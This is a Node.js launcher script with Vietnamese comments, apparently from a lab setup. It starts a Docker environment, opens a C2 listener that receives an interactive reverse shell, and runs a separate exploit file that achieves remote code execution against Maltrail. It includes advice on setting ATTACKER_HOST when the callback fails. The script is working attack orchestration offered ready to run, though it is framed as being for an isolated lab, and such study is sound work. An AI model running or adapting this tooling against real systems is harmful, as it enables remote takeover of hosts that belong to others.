/**
 * npm start: khởi động Docker lab + listener C2 + chạy exploit (chỉ dùng trong môi trường lab cô lập).
 */
const { spawn, execSync } = require("child_process");
const net = require("net");
const path = require("path");

const ROOT = path.join(__dirname, "..");
const C2_PORT = Number(process.env.C2_PORT || 4444);
const WAIT_MS = Number(process.env.LAB_WAIT_MS || 8000);

function execDockerUp() {
  process.stderr.write("[*] docker compose up -d --build …\n");
  execSync("docker compose up -d --build", { cwd: ROOT, stdio: "inherit" });
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function startListener() {
  return new Promise((resolve) => {
    const server = net.createServer((socket) => {
      const remote = `${socket.remoteAddress}:${socket.remotePort}`;
      process.stdout.write(`\n[+] Reverse shell từ ${remote}\n`);
      socket.pipe(process.stdout);
      process.stdin.pipe(socket);
      socket.on("error", () => {});
    });

    server.listen(C2_PORT, "0.0.0.0", () => {
      process.stderr.write(
        `[*] Listener C2: 0.0.0.0:${C2_PORT} (Maltrail kết nối tới host qua host.docker.internal)\n`
      );
      resolve(server);
    });

    server.on("error", (err) => {
      process.stderr.write(`[!] Không mở được port ${C2_PORT}: ${err.message}\n`);
      process.exit(1);
    });
  });
}

async function runExploit() {
  const exploitPath = path.join(__dirname, "exploit.js");
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [exploitPath], {
      cwd: ROOT,
      stdio: "inherit",
      env: { ...process.env, C2_PORT: String(C2_PORT) },
    });
    child.on("exit", (code) => {
      if (code === 0) resolve();
      else reject(new Error(`exploit.js thoát với mã ${code}`));
    });
  });
}

async function main() {
  execDockerUp();
  await sleep(WAIT_MS);
  const server = await startListener();
  await sleep(1500);

  process.stderr.write("[*] Gửi exploit (tạo basket + trigger Maltrail)…\n");
  try {
    await runExploit();
  } catch (e) {
    process.stderr.write(`[!] ${e.message}\n`);
  }

  process.stderr.write(
    "[*] Nếu reverse shell không kết nối (Linux): đặt ATTACKER_HOST=IP máy host (ví dụ 172.17.0.1) rồi chạy lại npm run exploit.\n"
  );
  process.stderr.write(
    "[*] Nếu RCE thành công, shell tương tác ở trên; Ctrl+C để thoát.\n"
  );

  process.on("SIGINT", () => {
    server.close();
    process.exit(0);
  });
}

main();
